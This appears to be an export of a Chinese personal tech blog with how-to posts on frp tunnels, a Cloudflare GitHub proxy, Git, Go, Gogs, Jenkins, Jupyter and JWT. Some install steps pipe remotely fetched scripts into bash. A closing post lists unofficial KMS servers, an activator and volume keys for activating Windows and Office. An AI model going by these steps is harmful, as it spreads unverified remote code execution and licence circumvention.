ExecReload=/usr/local/bin/frps reload -c /etc/frps/frps.ini LimitNOFILE=1048576 [Install] WantedBy=multi-user.target sudo systemctl daemon-reload sudo systemctl start frps.service sudo systemctl enable --now frps.service 3. 客户端安装 3.1 解压文件 tar -zxvf frp_0.44.0_linux_amd64.tar.gz cd frp_0.44.0_linux_amd64/ cp frpc /usr/local/bin/ frpc.ini 配置文件详解
[common] #远程frp服务器地址，可ip可域名 server_addr = frp02.wefinger.club #远程frp服务器通信端口 server_port = 7000 #特权密钥 token = 12345678 #http穿透 [demo-http] #穿透类型 type = http #本地监听ip local_ip = 127.0.0.1 #本地监听端口，欲穿透转发端口。 local_port = 8080 #自定义穿透域名，该域名需要解析至frp服务器。 custom_domains = testhttp.frp02.wefinger.club #https穿透 [demo-https] type = https local_ip = 127.0.0.1 local_port = 8088 custom_domains = testhttps.frp02.wefinger.club #tcp穿透，例如ssh、ftp服务 [demo-tcp] type = tcp #欲穿透地址，本地必须可访问。 local_ip = 127.0.0.1 #可批量绑定，使用`,`分隔，或者使用`-`定义端口段。 local_port = 22 #绑定远程端口，可批量绑定，使用`,`分隔，或者使用`-`定义端口段。 remote_port = 20022 #udp穿透,例如转发dns服务 [demo-udp] type = udp local_ip = 8.8.8.8 local_port = 53 remote_port = 20053 3.2 启动 配置文件根据各网站的粘贴过来就行
3.2.1 直接启动 启动
./frpc -c ./frpc.ini &amp;amp; 3.2.2 后台启动 配置后台自动启动
sudo vim /lib/systemd/system/frpc.service [Unit] Description=Frp Client Service After=network.target [Service] Type=simple User=nobody Restart=on-failure RestartSec=5s ExecStart=/usr/local/bin/frpc -c /etc/frpc/frpc.ini ExecReload=/usr/local/bin/frpc reload -c /etc/frpc/frpc.ini LimitNOFILE=1048576 [Install] WantedBy=multi-user.target sudo systemctl daemon-reload sudo systemctl start frpc.service sudo systemctl enable frpc.service 3.3 配置多个隧道 创建配置文件目录
mkdir -p /etc/frpc 打开配置文件的目录，编写对应的配置文件
cd /etc/frpc vim 102SSH.ini 配置示例如下
[common] server_addr = cn-gydx-bgp-1.openfrp.top server_port = 8120 tls_enable = true tcp_mux = true protocol = tcp user = 8022c3fe7ba2d9d8c953f899b86da17a tls_enable = true token = mnE3A8hIWapwShje dns_server = 114.114.114.114 [102UH] privilege_mode = true type = tcp local_ip = 192.168.5.102 local_port = 1022 remote_port = 60856 use_encryption = false use_compression = false 配置System服务
vim /lib/systemd/system/frpc@.service [Unit] Description=Frp Client Service After=network.target [Service] Type=simple User=nobody Restart=on-failure RestartSec=5s ExecStart=/usr/local/bin/frpc -c /etc/frpc/%i.ini ExecReload=/usr/local/bin/frpc reload -c /etc/frpc/%i.ini LimitNOFILE=1048576 [Install] WantedBy=multi-user.target 根据配置文件名称来启动服务
systemctl daemon-reload systemctl start frpc@102SSH systemctl status frpc@102SSH systemctl enable frpc@102SSH 如果您忘记了之前开启过哪些隧道，使用下面的命令可以列出当前运行中的隧道
systemctl list-units frpc@* 如果您忘记了之前设置过的自启隧道，可以使用下面的命令列出
systemctl list-units --all frpc@*</content></entry><entry><title>GitHub代理加速</title><url>/posts/git/github%E4%BB%A3%E7%90%86%E5%8A%A0%E9%80%9F/</url><categories><category>Git</category></categories><tags><tag>Git</tag></tags><content type="html"><![CDATA[  项目地址： https://github.com/hunshcn/gh-proxy 使用cloudflare免费的代理加速 网址： https://workers.cloudflare.com 先登录或注册 将下面的放入左侧的方框中(不需要任何的改动)
&#39;use strict&#39; /** * static files (404.html, sw.js, conf.js) */ const ASSET_URL = &#39;https://hunshcn.github.io/gh-proxy/&#39; // 前缀，如果自定义路由为example.com/gh/*，将PREFIX改为 &#39;/gh/&#39;，注意，少一个杠都会错！ const PREFIX = &#39;/&#39; // 分支文件使用jsDelivr镜像的开关，0为关闭，默认关闭 const Config = { jsdelivr: 0 } const whiteList = [] // 白名单，路径里面有包含字符的才会通过，e.g. [&#39;/username/&#39;] /** @type {RequestInit} */ const PREFLIGHT_INIT = { status: 204, headers: new Headers({ &#39;access-control-allow-origin&#39;: &#39;*&#39;, &#39;access-control-allow-methods&#39;: &#39;GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS&#39;, &#39;access-control-max-age&#39;: &#39;1728000&#39;, }), } const exp1 = /^(?:https?:\/\/)?github\.com\/.+?\/.+?\/(?:releases|archive)\/.*$/i const exp2 = /^(?:https?:\/\/)?github\.com\/.+?\/.+?\/(?:blob|raw)\/.*$/i const exp3 = /^(?:https?:\/\/)?github\.com\/.+?\/.+?\/(?:info|git-).*$/i const exp4 = /^(?:https?:\/\/)?raw\.(?:githubusercontent|github)\.com\/.+?\/.+?\/.+?\/.+$/i const exp5 = /^(?:https?:\/\/)?gist\.(?:githubusercontent|github)\.com\/.+?\/.+?\/.+$/i const exp6 = /^(?:https?:\/\/)?github\.com\/.+?\/.+?\/tags.*$/i /** * @param {any} body * @param {number} status * @param {Object&lt;string, string&gt;} headers */ function makeRes(body, status = 200, headers = {}) { headers[&#39;access-control-allow-origin&#39;] = &#39;*&#39; return new Response(body, {status, headers}) } /** * @param {string} urlStr */ function newUrl(urlStr) { try { return new URL(urlStr) } catch (err) { return null } } addEventListener(&#39;fetch&#39;, e =&gt; { const ret = fetchHandler(e) .catch(err =&gt; makeRes(&#39;cfworker error:\n&#39; + err.stack, 502)) e.respondWith(ret) }) function checkUrl(u) { for (let i of [exp1, exp2, exp3, exp4, exp5, exp6]) { if (u.search(i) === 0) { return true } } return false } /** * @param {FetchEvent} e */ async function fetchHandler(e) { const req = e.request const urlStr = req.url const urlObj = new URL(urlStr) let path = urlObj.searchParams.get(&#39;q&#39;) if (path) { return Response.redirect(&#39;https://&#39; + urlObj.host + PREFIX + path, 301) } // cfworker 会把路径中的 `//` 合并成 `/` path = urlObj.href.substr(urlObj.origin.length + PREFIX.length).replace(/^https?:\/+/, &#39;https://&#39;) if (path.search(exp1) === 0 || path.search(exp5) === 0 || path.search(exp6) === 0 || path.search(exp3) === 0 || path.search(exp4) === 0) { return httpHandler(req, path) } else if (path.search(exp2) === 0) { if (Config.jsdelivr) { const newUrl = path.replace(&#39;/blob/&#39;, &#39;@&#39;).replace(/^(?:https?:\/\/)?github\.com/, &#39;https://cdn.jsdelivr.net/gh&#39;) return Response.redirect(newUrl, 302) } else { path = path.replace(&#39;/blob/&#39;, &#39;/raw/&#39;) return httpHandler(req, path) } } else if (path.search(exp4) === 0) { const newUrl = path.replace(/(?&lt;=com\/.+?\/.+?)\/(.+?\/)/, &#39;@$1&#39;).replace(/^(?:https?:\/\/)?raw\.(?:githubusercontent|github)\.com/, &#39;https://cdn.jsdelivr.net/gh&#39;) return Response.redirect(newUrl, 302) } else { return fetch(ASSET_URL + path) } } /** * @param {Request} req * @param {string} pathname */ function httpHandler(req, pathname) { const reqHdrRaw = req.headers // preflight if (req.method === &#39;OPTIONS&#39; &amp;&amp; reqHdrRaw.has(&#39;access-control-request-headers&#39;) ) { return new Response(null, PREFLIGHT_INIT) } const reqHdrNew = new Headers(reqHdrRaw) let urlStr = pathname let flag = !Boolean(whiteList.length) for (let i of whiteList) { if (urlStr.includes(i)) { flag = true break } } if (!flag) { return new Response(&#34;blocked&#34;, {status: 403}) } if (urlStr.startsWith(&#39;github&#39;)) { urlStr = &#39;https://&#39; + urlStr } const urlObj = newUrl(urlStr) /** @type {RequestInit} */ const reqInit = { method: req.method, headers: reqHdrNew, redirect: &#39;manual&#39;, body: req.body } return proxy(urlObj, reqInit) } /** * * @param {URL} urlObj * @param {RequestInit} reqInit */ async function proxy(urlObj, reqInit) { const res = await fetch(urlObj.href, reqInit) const resHdrOld = res.headers const resHdrNew = new Headers(resHdrOld) const status = res.status if (resHdrNew.has(&#39;location&#39;)) { let _location = resHdrNew.get(&#39;location&#39;) if (checkUrl(_location)) resHdrNew.set(&#39;location&#39;, PREFIX + _location) else { reqInit.redirect = &#39;follow&#39; return proxy(newUrl(_location), reqInit) } } resHdrNew.set(&#39;access-control-expose-headers&#39;, &#39;*&#39;) resHdrNew.set(&#39;access-control-allow-origin&#39;, &#39;*&#39;) resHdrNew.delete(&#39;content-security-policy&#39;) resHdrNew.delete(&#39;content-security-policy-report-only&#39;) resHdrNew.delete(&#39;clear-site-data&#39;) return new Response(res.body, { status, headers: resHdrNew, }) } 点击保存并部署后可以点击发送测试是否成功 目前国内无法访问 *.workers.dev，需要cloudflare托管的域名反代进行CNAME解析 之后点击Worker路由-&gt; 添加路由 按照下图的形式编写进行保存即可 之后就能通过自定义的域名进行访问
终端使用方法 例如下载 Releases 文件
# 原来的使用方法 wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz # 代理使用方法 wget https://gitpy.colzry.tk/https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz clone也是如此
  ]]></content></entry><entry><title>Git的基本使用</title><url>/posts/git/git%E5%9F%BA%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8/</url><categories><category>Git</category></categories><tags><tag>Git</tag></tags><content type="html"><![CDATA[  1. 设置签名 git config --global user.name tom #设置用户名tom git config --global user.email xxx@qq.com #设置用户邮箱 2. 创建本地仓库 $ git init 3. 版本提交 3.1 状态查看 git status #查看工作区、暂存区状态 3.2 添加 git add fileName #指定文件 git add . #所有 说明：将工作区的文件添加到暂存区 3.3 提交 git commit -m &#39;commit message&#39; 说明：将暂存区内容提交到本地库 3.4 查看历史记录 git log git reflog #常用 git log --greph #图形显示,更直观 git log --pretty=oneline #漂亮一行显示 git log --oneline #简洁显示 说明：HEAD@{移动到当前版本需要多少步} 4. 分支操作 4.1 创建分支 git branch 分支名 4.2 查看分支 git branch git branch -v 4.3 切换分支 git checkout 分支名 git checkout -b 分支名 #创建分支并直接切换到该分支 4.4 重命名分支 在当前分支
git branch -m new_branch_name 不在当前分支
git branch -m old_name new_name 4.5 合并分支 **相当于把修改了的文件拉过来**
git rebase &lt;branch&gt; 将指定的分支合并到当前分支 git merge --no-ff xxx 注意：合并分支的时候要明确谁谁合并 我在a分支里面修改了。要合并到master，就先切换到master，然后合并b 4.6 删除分支 git branch -d 分支名 5. 使用远程仓库 5.1 创建远程库地址别名 git remote -v #查看远程地址别名 git remote add 别名 远程地址 git remote set-url 别名 远程地址 例子：git remote add origin https://xx 5.2 推送 **开发修改完把本地库的文件推送到远程仓库**** ****前提是提交到了本地库才可以推送**
git push 别名 分支名 git push -u 别名 分支名 #-u指定默认主机 git push -f # 强制推送 例子：git push origin master 5.3 克隆 **完整的把远程库克隆到本地**** **克隆下来后不要在主分支里面做开发** ****clone进行一次，从无到有的过程，更新用pull**
git clone 远程地址 例子：git clone https://xx 5.4 拉取 **本地存在clone下来的文件 就用pull更新**
pull = fetch + merge git fetch 别名 分支名 git merge 别名 分支名 git pull 别名 分支名 5.5 解决冲突 注意：解决冲突后的提交是不能带文件名的 如果不是基于远程库最新版做的修改不能推送，必须先pull下来安装冲突办法解决
# 查看所有分支 git reflog # 回退到上一个版本 git rest --hard HEAD^ # 回退到上上个版本 git rest --hard HEAD^^ # 回退到commit id为ba7914b的版本 git rest --hard ba7914b git pull origin/master # 合并之后修改冲突 git diff origin/master   ]]></content></entry><entry><title>Git设置代理</title><url>/posts/git/git%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url><categories><category>Git</category></categories><tags><tag>Git</tag></tags><content type="html"><![CDATA[  # 以下使用http代理 git config --global http.proxy http://127.0.0.1:10809 git config --global https.proxy https://127.0.0.1:10809 # 以下使用socks5代理 git config --global http.proxy socks5://127.0.0.1:10808 git config --global https.proxy socks5://127.0.0.1:10808 # 取消代理 git config --global --unset http.proxy git config --global --unset https.proxy git config --global url.&#34;https://gitpy.colzry.tk/&#34;.insteadOf https:// git config --global --remove-section url.&#34;https://gitpy.colzry.tk/&#34;   ]]></content></entry><entry><title>go mod的使用</title><url>/posts/golang/go-mod/</url><categories><category>Golang</category></categories><tags><tag>Golang</tag></tags><content type="html"><![CDATA[  常用命令
# 初始化模块 cd &lt;mod_name&gt; go mod init &lt;mod_name&gt; # 删除没用的依赖，下载位拉取的依赖 go mod tidy go mod使用 | 全网最详细   ]]></content></entry><entry><title>go workspace快速使用</title><url>/posts/golang/go-workspace/</url><categories><category>Golang</category></categories><tags><tag>Golang</tag></tags><content type="html"> 常用命令
# 初始化工作区 go work init [dirnames] # 添加模块 go work use [dirnames] 官方博文：Go 1.18工作区模式最佳实践 Go 1.18 workspace 使用初体验_Seekload的博客-CSDN博客</content></entry><entry><title>Gogs服务搭建</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/gogs%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag><tag>Gogs</tag></tags><content type="html"> Gogs服务搭建 1. 安装 wget https://github.com/gogs/gogs/releases/download/v0.13.0/gogs_0.13.0_linux_amd64.tar.gz # 网络不好可以使用下面的 wget https://picture-czy.oss-cn-beijing.aliyuncs.com/shareFile/gogs_0.13.0_linux_amd64.tar.gz tar -zxvf gogs_0.13.0_linux_amd64.tar.gz -C /usr/local # 修改目录拥有者，如无用户先添加 U:G chown -R gogs:gogs gogs/ 无用户的先添加用户，并为用户赋予gogs目录的权限
#创建用户组 groupadd gogs #创建用户家目录 mkdir -p /home/gogs #创建用户 useradd -g gogs -d /home/gogs -s /bin/bash gogs #用户家目录赋权755 4-&amp;gt;r 2-&amp;gt;w 1-&amp;gt;x chmod -R 755 /home/gogs #修改gogs目录拥有者 chown -R gogs:gogs /usr/local/gogs/ 2. 添加守护进程 在安装目录的scripts/systemd下有官方的脚本可以参考 以下的内容经过修改，若启动不成功可以尝试更改custom/conf/目录下的配置文件
vim /lib/systemd/system/gogs.service [Unit] Description=Gogs After=syslog.target After=network.target [Service] Type=simple User=gogs Group=gogs WorkingDirectory=/usr/local/gogs ExecStart=/usr/local/gogs/gogs web Restart=always Environment=USER=gogs HOME=/home/gogs [Install] WantedBy=multi-user.target systemctl daemon-reload systemctl start gogs.service systemctl status gogs.service systemctl enable gogs.service --now</content></entry><entry><title>Golang1.18泛型新特性</title><url>/posts/golang/1.18-%E6%B3%9B%E5%9E%8B%E6%96%B0%E7%89%B9%E6%80%A7/</url><categories><category>Golang</category></categories><tags><tag>Golang</tag></tags><content type="html"> Go 1.18 泛型全面讲解：一篇讲清泛型的全部</content></entry><entry><title>Go语言快速上手</title><url>/posts/golang/go%E8%AF%AD%E8%A8%80%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/</url><categories><category>Golang</category></categories><tags><tag>Golang</tag></tags><content type="html"><![CDATA[  在Linux上安装GoLang wget https://golang.google.cn/dl/go1.19.1.linux-amd64.tar.gz rm -rf /usr/local/go &amp;amp;&amp;amp; tar -C /usr/local -xzf go1.19.1.linux-amd64.tar.gz echo &amp;#39;export PATH=$PATH:/usr/local/go/bin&amp;#39; &amp;gt;&amp;gt; $HOME/.profile source $HOME/.profile go version go env -w GO111MODULE=on go env -w GOPROXY=https://goproxy.cn,direct 在Windows上安装GoLang 官网地址 国内镜像地址 下载.msi文件安装后，配置环境变量
将安装的Go\bin 目录添加到 Path 环境变量中
将工作目录也添加到环境变量中
确认之后检查是否成功
配置开发环境 配置「七牛云」的代理服务
$ go env -w GO111MODULE=on $ go env -w GOPROXY=https://goproxy.cn,direct 配置工作路径
go env -w GOPATH=C:\WorkDir\Go # 这是我的工作路径，填自己的 打开vscode安装GO语言的插件
之后工作目录下新建一个src目录，在该目录下创建xxx.go文件，根据vscode的提示安装所有的包
变量的声明 // 法一 var num int = 100 var str string = &amp;#34;123&amp;#34; // 法二 知道变量的值后可以不用声明属性 var num = 100 var str = &amp;#34;123&amp;#34; // 法三 此方法只能用在局部变量中 num := 100 str := &amp;#34;123&amp;#34; // 多行声明 var num, str = 100, &amp;#34;123&amp;#34; var ( num = 100 str = &amp;#34;123&amp;#34; ) num, str := 100, &amp;#34;123&amp;#34; 常量的定义 // 常量只读，不允许修改 const num int = 100 // const …  ]]></content></entry><entry><title>iperf3的使用</title><url>/posts/linux%E6%93%8D%E4%BD%9C/iperf3%E7%9A%84%E4%BD%BF%E7%94%A8/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>工具使用</tag></tags><content type="html"> 1. 安装 1.1 linux # Debian sudo apt install iperf3 -y # Centos sudo yum install iperf3 -y 1.2 windows 官网下载地址 2. 使用 2.1 详细命令参数 -p, --port #，Server 端监听、Client 端连接的端口号； -f, --format [kmgKMG]，报告中所用的数据单位，Kbits, Mbits, KBytes, Mbytes； -i, --interval #，每次报告的间隔，单位为秒； -F, --file name，测试所用文件的文件名。如果使用在 Client 端，发送该文件用作测试；如果使用在 Server 端，则是将数据写入该文件，而不是丢弃； -A, --affinity n/n,m，设置 CPU 亲和力； -B, --bind ，绑定指定的网卡接口； -V, --verbose，运行时输出更多细节； -J, --json，运行时以 JSON 格式输出结果； --logfile f，输出到文件； -d, --debug，以 debug 模式输出结果； -v, --version，显示版本信息并退出； -h, --help，显示帮助信息并退出。 Server 端参数： -s, --server，以 Server 模式运行； -D, --daemon，在后台以守护进程运行； -I, --pidfile file，指定 pid 文件； -1, --one-off，只接受 1 次来自 Client 端的测试，然后退出。 Client 端参数 -c, --client ，以 Client 模式运行，并指定 Server 端的地址； -u, --udp，以 UDP 协议进行测试； -b, --bandwidth #[KMG][/#]，限制测试带宽。UDP 默认为 1Mbit/秒，TCP 默认无限制； -t, --time #，以时间为测试结束条件进行测试，默认为 10 秒； -n, --bytes #[KMG]，以数据传输大小为测试结束条件进行测试； -k, --blockcount #[KMG]，以传输数据包数量为测试结束条件进行测试； -l, --len #[KMG]，读写缓冲区的长度，TCP 默认为 128K，UDP 默认为 8K； …</content></entry><entry><title>Java多线程同步锁</title><url>/posts/java/java-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E9%94%81/</url><categories><category>Java</category></categories><tags><tag>Java</tag></tags><content type="html"><![CDATA[   同步监视器必须为唯一的对象
例如：this, *.class
若使用*.class时，报以下错误
则原因为： 线程操作的wait()、notify()、notifyAll()方法只能在同步控制方法或同步控制块内调用。如果在非同步控制方法或控制块里调用，程序能通过编译，但运行的时候，将得到 java.lang.IllegalMonitorStateException 异常，并伴随着一些含糊信息，比如 current thread is not owner(当前线程不是拥有者)。其实异常的含义是 调用wait()、notify()、notifyAll()的任务在调用这些方法前必须 ‘拥有’（获取）对象的锁。
解决方法： 在wait()、notify()、notifyAll()方法调用是加上调用的对象，例如：*.class.wait();
具体实现 使用两个线程间隔递增的打印0到100
使用*.class同步监视器 public class demo implements Runnable{ public static int number = 0; @Override public void run() { while (true) { synchronized (demo.class) { demo.class.notify(); if (number &lt;= 100) { try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + &#34; : &#34; + number++); try { demo.class.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } else { System.exit(0); } } } } public static void main(String[] args) { demo demo = new demo(); Thread thread1 = new Thread(demo); Thread thread2 = new Thread(demo); thread1.setName(&#34;线程1&#34;); thread2.setName(&#34;线程2&#34;); thread1.start(); thread2.start(); } } 使用this同步监视器 public class demo implements Runnable{ public static int number = 0; @Override public void run() { while (true) { synchronized (this) { this.notify(); if (number &lt;= 100) { try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + &#34; : &#34; + number++); try { this.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } else { System.exit(0); } } } } public static void main(String[] args) { demo demo = new demo(); Thread thread1 = new Thread(demo); Thread thread2 = new Thread(demo); thread1.setName(&#34;线程1&#34;); thread2.setName(&#34;线程2&#34;); thread1.start(); thread2.start(); } }   ]]></content></entry><entry><title>JenKins入门</title><url>/posts/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/jenkins/</url><categories><category>框架和中间件</category></categories><tags><tag>Jenkins</tag></tags><content type="html"><![CDATA[  1. 安装准备 1.1 安装Docker $ curl -fsSL get.docker.com -o get-docker.sh $ sudo sh get-docker.sh --mirror Aliyun $ sudo systemctl start docker $ sudo systemctl enable docker 1.2 安装docker-compose $ dnf install docker-compose -y 1.3 安装gitlab 拉取gitlab镜像
docker pull gitlab/gitlab-ce 建立compose文件目录
mkdir -p /usr/local/docker/gitlab_docker 创建compose文件
cd /usr/local/docker/gitlab_docker vim docker-compose.yml version: &#39;3.0&#39; services: gitlab: image: &#39;gitlab/gitlab-ce&#39; container_name: gitlab restart: always environment: TZ: &#39;Asia/Shanghai&#39; GITLAB OMNIBUS CONFIG: external_url &#39;http://192.168.211.100:8929&#39; gitlab_rails[&#39;gitlab_shell_ssh_port&#39;] = 2224 ports: - &#39;8929:8929&#39; - &#39;2224:2224&#39; volumes: - &#39;./config:/etc/gitlab&#39; - &#39;./logs:/var/log/gitlab&#39; - &#39;./data:/var/opt/gitlab&#39; 启动
docker-compose up -d # 查看日志 docker-compose logs -f # 查看root账户密码 docker exec -it gitlab bash 1.4 安装JDK8 bash &lt;(curl -Ssl https://picture-czy.oss-cn-beijing.aliyuncs.com/shareFile/jdk-install.sh) 1.5 安装Maven 下载地址：
wget https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.8.6/binaries/apache-maven-3.8.6-bin.tar.gz tar zxvf apache-maven-3.8.6-bin.tar.gz -C /usr/local echo &#34;export MAVEN_HOME=/usr/local/apache-maven-3.8.6&#34; &gt;&gt; ~/.bashrc echo &#34;export PATH=$MAVEN_HOME/bin:$PATH&#34; &gt;&gt; ~/.bashrc source ~/.bashrc mvn -version 修改配置文件
vim /usr/local/apache-maven-3.8.6/conf/settings.xml &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;profile&gt; &lt;id&gt;jdk8&lt;/id&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;jdk&gt;1.8&lt;/jdk&gt; &lt;/activation&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;maven.compiler.compilerVersion&gt;1.8&lt;/maven.compiler.compilerVersion&gt; &lt;/properties&gt; &lt;/profile&gt; 1.6 安装Jenkins 1.6.1 通过docker安装jenkins docker安装地址： https://hub.docker.com/r/jenkins/jenkins/tags?page=1&amp;name=lts docker pull jenkins/jenkins:2.361.1-lts cd /usr/local/ mkdir -p docker/jenkins_docker cd docker/jenkins_docker vim docker-compose.yml ################################################ version: &#34;3.1&#34; services: jenkins: image: jenkins/jenkins:2.361.1-lts container_name: jenkins ports: - 8080:8080 - 50000:50000 volumes: - ./data/:/var/jenkins_home/ ################################################ mkdir data chmod -R 777 data/ docker-compose up -d # 通过日志查看密码 docker logs -f jenkins 进入8080端口进行登录，密码可以在日志中查看 进入后选择右边的默认安装，之后都是下一步
1.6.2 安装Jenkins插件 1.6.3 CP JDK和Maven cd /usr/local/docker/jenkins_docker/data/ cp -r /usr/local/jdk1.8.0_202/ ./ cp -r /usr/local/apache-maven-3.8.6/ ./   ]]></content></entry><entry><title>Jupyter lab安装和配置</title><url>/posts/python/jupyter-lab-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url><categories><category>Python</category></categories><tags><tag>Python</tag><tag>Jupyter</tag></tags><content type="html"><![CDATA[  
通过pip安装 若没有pip可以先安装
sudo apt-get install python3-pip 安装 jupyter-lab
pip install jupyterlab 安装中文环境包
pip install jupyterlab-language-pack-zh-CN 配置局域网可以访问 先查看配置文件的位置
jupyter-lab --generate-config 编辑配置文件
sudo vim ~/.jupyter/jupyter_lab_config.py 找到下面的配置，取消注释并修改成下面的样子(可通过****进行查找)，保存后退出
**注意：**取消注释也要把注释后面的空格取消，不然启动时会报错
c.ServerApp.ip = &#39;*&#39; # 下面的设置为可选的，不想设置的可以跳过(要通过root用户进行设置/普通用户和root用户的配置目录不一样) # 设置默认打开的目录 c.ServerApp.root_dir = &#39;/home/debian/&#39; # 允许root用户运行登录 c.ServerApp.allow_root = True # 允许远程访问 c.ServerApp.allow_remote_access = True 设置jupyter-lab网页的密码 jupyter-lab password 密码要输入两次
设置中文 启动jupyter-lab
jupyter lab 在浏览器中输入 http://主机ip:8888/lab 访问
进入后输入刚才设置的密码，进入主页面后设置中文
插件安装 pip install ipympl pip install jupyterlab_github pip install nglview 自动补全插件安装
pip install &#34;jupyterlab-kite&gt;=2.0.2&#34; bash -c &#34;$(wget -q -O - https://linux.kite.com/dls/linux/current)&#34; 安装主题 pip install jupyterthemes # 主题安装 jt -l # 显示可用主题 jt -t chosen_theme # 切换主题 查看主题，携带的主题有7个：
onedork grade3 oceans16 chesterish monokai solarizedl solarizedd 设置开机自启动 以服务的形式，配置开机启动项
vim /etc/systemd/system/jupyter.service 添加如下代码：
[Unit] Description=Jupyter Notebook After=network.target [Service] Type=simple ExecStart=/usr/local/bin/jupyter-lab --config=/root/.jupyter/jupyter_server_config.json --no-browser User=root Group=root WorkingDirectory=/root/workDir Restart=always RestartSec=10 [Install] WantedBy=multi-user.target 设置自启动
sudo systemctl enable jupyter sudo systemctl start jupyter 安装Java内核 sudo apt install openjdk-8-jre-headless sudo apt install openjdk-8-jdk-headless 查看Java版本
java -version 安装IJava
wget https://github.com/SpencerPark/IJava/releases/download/v1.3.0/ijava-1.3.0.zip unzip ijava-1.3.0.zip python3 install.py --sys-prefix 查看内核
jupyter kernelspec list 对应的web页面也有了
  ]]></content></entry><entry><title>JWT认证</title><url>/posts/%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%8A%A0%E5%AF%86/jwt%E8%AE%A4%E8%AF%81/</url><categories><category>认证和加密</category></categories><tags><tag>JWT</tag></tags><content type="html"><![CDATA[  JWT认证 1. 什么是JWT JSON Web Token（JWT）是一个开放的行业标准（RFC 7519），它定义了一种简洁的、自包含的协议格式，用于在通信双方传递json对象，传递的信息经过数字签名可以被验证和信任。JWT可以使用HMAC算法或使用RSA的公钥/私钥对来签名，防止被篡改。
2. JWT的优缺点 优点
快速 无状态 多个服务端认证 缺点
密钥泄漏风险高 令牌容易被窃取 3. JWT的结构 官网链接： jwt.io JWT令牌由Header、Payload、Signature三部分组成，每部分中间使用点（.）分隔，例如
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.cThIIoDvwdueQB468K5xDc5633seEFoqwxjF_xSJyQQ 3.1 Header 头部包括令牌的类型（即JWT）及使用的加密算法（如HS256或RS256）。 例如：
{ &#34;alg&#34;: &#34;HS256&#34;, &#34;typ&#34;: &#34;JWT&#34; } HS256就是HMAC-SHA256，加密算法使用HMAC，摘要算法使用SHA256。 将上边的内容使用Base64Url编码，得到一个字符串就是JWT令牌的第一部分。
3.2 Payload 第二部分是负载，内容也是一个json对象，它是存放有效信息的地方，它可以存放jwt提供的现成字段，比 如：iss（签发者）,exp（过期时间戳）, sub（面向的用户）等，也可自定义字段。 此部分不建议存放敏感信息，因为此部分可以解码还原原始内容。 例如：
{ &#34;sub&#34;: &#34;1234567890&#34;, &#34;name&#34;: &#34;John Doe&#34;, &#34;iat&#34;: 1516239022 } 将第二部分负载使用Base64Url编码，得到一个字符串就是JWT令牌的第二部分。
其中官方将第二部分为三个内容
Registered claims: 官方预定义的、非强制性的但是推荐使用的、有助于交互的声明(注意使用这些声明只能是三个字符)。 Public claims： 保留给 JWT 的使用者自定义。但是需要注意避免使用IANA JSON Web Token Registry中定义的关键字。 Private claims: 保留给 JWT 的使用者自定义，用来传送传输双方约定好的消息。 3.3 Signature 第三部分是签名，此部分用于防止jwt内容被篡改。 这个部分使用base64url将前两部分进行编码，编码后使用点（.）连接组成字符串，最后使用header中声明 签名算法进行签名。 一个例子：
HMACSHA256( base64UrlEncode(header) + &#34;.&#34; + base64UrlEncode(payload), secret) 其中 secret 可以为自定义的加密盐
base64UrlEncode(header)：jwt令牌的第一部分。 base64UrlEncode(payload)：jwt令牌的第二部分。 secret：签名所使用的密钥。
注意： 第三部分只是为了防止JWT的内容被篡改，并不能存入有效的信息
  ]]></content></entry><entry><title>KMS服务列表</title><url>/posts/%E5%85%B6%E4%BB%96/kms/</url><categories><category>Other</category></categories><tags><tag>KMS</tag></tags><content type="html"><![CDATA[  激活工具地址 https://github.com/zbezj/HEU_KMS_Activator/releases kms服务器列表 s8.uk.to kms.loli.beer kms.loli.best kms.03k.org kms.cary.tech kms.catqu.com kms.ghpym.com kms.mc06.net kms.sixyin.com win11密钥 VK7JG-NPHTM-C97JM-9MPGT-3V66T W269N-WFGWX-YVC9B-4J6C9-T83GX # Windows专业版和教育版激活 slmgr.vbs -ipk W269N-WFGWX-YVC9B-4J6C9-T83GX slmgr /skms kms.03k.org slmgr /ato # Office专业版和专业增强版激活(注意查看目录是否正确) cd &#34;C:\Program Files\Microsoft Office\Office16&#34; cscript ospp.vbs /inpkey:FXYTK-NJJ8C-GB6DW-3DYQT-6F7TH cscript ospp.vbs /sethst:s8.uk.to cscript &#34;C:\Program Files\Microsoft Office\Office16\OSPP.VBS&#34; /sethst:s8.uk.to cscript ospp.vbs /act # Office Tool Plus 下载地址（推荐使用） https://otp.landian.vip/zh-cn/ Office LTSC 